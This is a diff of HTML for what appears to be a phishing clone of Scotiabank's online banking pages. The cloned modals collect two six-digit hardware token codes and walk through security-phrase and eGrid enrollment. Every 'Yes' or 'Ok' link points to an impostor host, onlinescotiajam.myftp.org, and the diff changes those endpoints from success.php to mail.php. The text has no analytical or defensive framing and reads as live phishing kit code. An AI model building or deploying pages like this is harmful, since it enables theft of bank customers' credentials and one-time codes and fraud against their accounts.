 			            <div class="RUIFW-modal-body modal-body modal-body">
 			                <div class="pad-btm-10">
 				         
- 			                    <iframe width="550" height="350" src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/saved_resource.html" frameborder="0"></iframe>
+ 			                    <iframe width="550" height="350" src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/saved_resource.html" frameborder="0"></iframe>
 			                </div>
 			            </div>
 			        </div>
@@ -536,7 +547,7 @@ hr {
 				<div class="RUIFW-modal-header modal-header">
 					<button type="button" class="close_icon" data-dismiss="modal"></button>
 					<h4 class="RUIFW-modal-title modal-title" id="myModalLabel">
-						<img src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/scotiabank-group.gif">
+						<img src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/scotiabank-group.gif">
 					</h4>
 				</div>
 				
@@ -546,7 +557,7 @@ hr {
 				</div>
 				
 				<div class="RUIFW-modal-footer btn-holder modal-footer" id="aunth_sect_btns">
-							<button id="registerCancelPanelWindowNoButton" type="button" class="RUIFW-btn btn btn-default" data-dismiss="modal">No</button><a id="j_idt321:registerCancelPanelWindowYesButton" href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#" onclick="#" class="RUIFW-btn-primary btn btn-primary" data-dismiss="modal">Yes</a>
+							<button id="registerCancelPanelWindowNoButton" type="button" class="RUIFW-btn btn btn-default" data-dismiss="modal">No</button><a id="j_idt321:registerCancelPanelWindowYesButton" href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#" onclick="#" class="RUIFW-btn-primary btn btn-primary" data-dismiss="modal">Yes</a>
 				</div>
 				
 			</div>
@@ -565,7 +576,7 @@ hr {
 				<div class="RUIFW-modal-header modal-header">
 					<button type="button" class="close_icon" data-dismiss="modal"></button>
 					<h4 class="RUIFW-modal-title modal-title" id="myModalLabel">
-						<img src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/scotiabank-group.gif">
+						<img src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/scotiabank-group.gif">
 					</h4>
 				</div>
 				
@@ -575,7 +586,7 @@ hr {
 				</div>
 				
 				<div class="RUIFW-modal-footer btn-holder modal-footer" id="aunth_sect_btns">
-							<button id="cancelResetPasswordNoButton" type="button" class="RUIFW-btn btn btn-default" data-dismiss="modal">No</button><a id="j_idt327:cancelResetPasswordYesButton" href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#" onclick="#" class="RUIFW-btn-primary btn btn-primary" data-dismiss="modal">Yes</a>
+							<button id="cancelResetPasswordNoButton" type="button" class="RUIFW-btn btn btn-default" data-dismiss="modal">No</button><a id="j_idt327:cancelResetPasswordYesButton" href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#" onclick="#" class="RUIFW-btn-primary btn btn-primary" data-dismiss="modal">Yes</a>
 				</div>
 				
 			</div>
@@ -593,7 +604,7 @@ hr {
 				<div class="RUIFW-modal-header modal-header modal-header">
 					<button type="button" class="close_icon" data-dismiss="modal"></button>
 					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
-						<img src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/scotiabank-group.gif">
+						<img src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/scotiabank-group.gif">
 					</h4>
 					</div>
 					<div class="RUIFW-modal-body modal-body modal-body">
@@ -625,7 +636,7 @@ hr {
 							<div class="RUIFW-col-12 mrgn-top-20 col-sm-12 col-sm-12">
 								<label for="fts">First Token sequence</label><div id="syncTokenIncludeForm:token1" class="RUIFW-inline">
                                     <input id="syncTokenIncludeForm:tokenOne" type="password" name="syncTokenIncludeForm:tokenOne" autocomplete="off" value="" maxlength="6" class="RUIFW-form-el RUIFW-input-md form-control form-control">
-									<span class="token-holder"><img src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/token.png"></span></div>
+									<span class="token-holder"><img src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/token.png"></span></div>
 								<div class="form-alt-txt">(Type in the six digits that appear in your token screen).</div>
 								<br>
 							</div>
@@ -634,7 +645,7 @@ hr {
 							<div class="RUIFW-col-6 col-sm-6 col-sm-6">
 								<label for="sts">Second token sequence</label><div id="syncTokenIncludeForm:token2" class="RUIFW-inline">
                                     <input id="syncTokenIncludeForm:tokenTwo" type="password" name="syncTokenIncludeForm:tokenTwo" autocomplete="off" value="" maxlength="6" class="RUIFW-form-el RUIFW-input-md form-control form-control">
-									<span class="token-holder"><img src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/token.png"></span></div>
+									<span class="token-holder"><img src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/token.png"></span></div>
 								<div class="form-alt-txt">(Type in the six digits that appear in your token screen).</div>
 							</div><span id="syncTokenIncludeForm:synchronizationSuccessField">
 </span>
@@ -659,13 +670,13 @@ hr {
 				<div class="RUIFW-modal-header modal-header modal-header">
 					<button type="button" class="close_icon" data-dismiss="modal"></button>
 					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
-						<img src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/scotiabank-group.gif">
+						<img src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/scotiabank-group.gif">
 					</h4>
 					</div>
 					<div class="RUIFW-modal-body modal-body modal-body">
 						Important! You must create a security phrase to use Scotia Online/Mobile. This phrase will be displayed for your verification every time you sign in as an added layer of security.</div>
 					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
-						<button id="skip-enroll-step-cancel" type="button" class="RUIFW-btn btn btn-default btn btn-default" data-dismiss="modal">Cancel</button><a id="skipegridpopupForm:skip-enroll-step" href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Ok</a>
+						<button id="skip-enroll-step-cancel" type="button" class="RUIFW-btn btn btn-default btn btn-default" data-dismiss="modal">Cancel</button><a id="skipegridpopupForm:skip-enroll-step" href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Ok</a>
 					</div>
 				
 			</div>
@@ -683,13 +694,13 @@ hr {
 				<div class="RUIFW-modal-header modal-header modal-header">
 					<button type="button" class="close_icon" data-dismiss="modal"></button>
 					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
-						<img src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/scotiabank-group.gif">
+						<img src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/scotiabank-group.gif">
 					</h4>
 					</div>
 					<div class="RUIFW-modal-body modal-body modal-body">
 						You have chosen not to set your eGrid.  You will be asked to set your eGrid when you need to perform certain transactions such as adding a payee or a funds transfer recipient.</div>
 					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
-						<button id="skip-enroll-step-cancel" type="button" class="RUIFW-btn btn btn-default btn btn-default" data-dismiss="modal">Cancel</button><a id="skipSecurityQuestionPopup:skip-enroll-step" href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Ok</a>
+						<button id="skip-enroll-step-cancel" type="button" class="RUIFW-btn btn btn-default btn btn-default" data-dismiss="modal">Cancel</button><a id="skipSecurityQuestionPopup:skip-enroll-step" href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Ok</a>
 					</div>
 				
 			</div>
@@ -707,13 +718,13 @@ hr {
 				<div class="RUIFW-modal-header modal-header modal-header">
 					<button type="button" class="close_icon" data-dismiss="modal"></button>
 					<h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel">
-						<img src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/scotiabank-group.gif">
+						<img src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/scotiabank-group.gif">
 					</h4>
 					</div>
 					<div class="RUIFW-modal-body modal-body modal-body">
 						You must download your eGrid before leaving this page. Please save, print or take a picture of your eGrid. You will need it when performing certain transactions such as setting up Bill Payments and Funds Transfers. Click "Cancel" to return to the previous page and download your eGrid or "OK" if you have already downloaded it.</div>
 					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
-						<button id="skip-enroll-step-cancel" type="button" class="RUIFW-btn btn btn-default btn btn-default" data-dismiss="modal">Cancel</button><a id="completeEnrollmentForm:skip-enroll-step" href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Ok</a>
+						<button id="skip-enroll-step-cancel" type="button" class="RUIFW-btn btn btn-default btn btn-default" data-dismiss="modal">Cancel</button><a id="completeEnrollmentForm:skip-enroll-step" href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Ok</a>
 					</div>
 				
 			</div>
@@ -732,7 +743,7 @@ hr {
 				<div class="RUIFW-modal-header modal-header">
 					<button type="button" class="close_icon" data-dismiss="modal"></button>
 					<h4 class="RUIFW-modal-title modal-title" id="myModalLabel">
-						<img src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/scotiabank-group.gif">
+						<img src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/scotiabank-group.gif">
 					</h4>
 				</div>
 				
@@ -742,7 +753,7 @@ hr {
 				</div>
 				
 				<div class="RUIFW-modal-footer btn-holder modal-footer" id="aunth_sect_btns">
-							<button id="modalCancelConfirmationNoButton" type="button" class="RUIFW-btn btn btn-default" data-dismiss="modal">No</button><a id="createUsernameModalWindowFormWrapper:modalCancelConfirmationYesButton" href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#" onclick="#" class="RUIFW-btn-primary btn btn-primary" data-dismiss="modal">Yes</a>
+							<button id="modalCancelConfirmationNoButton" type="button" class="RUIFW-btn btn btn-default" data-dismiss="modal">No</button><a id="createUsernameModalWindowFormWrapper:modalCancelConfirmationYesButton" href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#" onclick="#" class="RUIFW-btn-primary btn btn-primary" data-dismiss="modal">Yes</a>
 				</div>
 				
 			</div>
